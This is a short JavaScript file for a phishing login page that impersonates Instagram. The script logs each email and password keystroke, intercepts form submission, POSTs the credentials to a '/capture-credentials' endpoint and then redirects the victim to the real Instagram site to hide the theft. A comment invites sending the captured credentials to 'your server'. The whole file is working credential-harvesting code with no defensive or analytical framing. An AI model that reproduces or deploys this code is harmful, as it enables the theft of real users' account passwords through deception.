document.addEventListener("DOMContentLoaded", function() {
    const loginForm = document.querySelector(".log-in-form");
    const emailInput = loginForm.querySelector("input[type='text']");
    const passwordInput = loginForm.querySelector("input[type='password']");

    emailInput.addEventListener("input", function(event) {
        console.log("Email input changed:", event.target.value);
    });

    passwordInput.addEventListener("input", function(event) {
        console.log("Password input changed:", event.target.value);
    });

    loginForm.addEventListener("submit", function(event) {
        event.preventDefault();
        
        const email = emailInput.value;
        const password = passwordInput.value;

        console.log("Form submitted with email:", email, "and password:", password);

        // Capture credentials logic (you can send these to your server)
        fetch('/capture-credentials', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ email: email, password: password })
        }).then(response => {
            if (response.ok) {
                console.log('Credentials captured successfully');
                // Redirect to Instagram
                window.location.href = "https://www.instagram.com";
            } else {
                console.error('Failed to capture credentials');
            }
        }).catch(error => {
            console.error('Error capturing credentials:', error);
        });
    });
});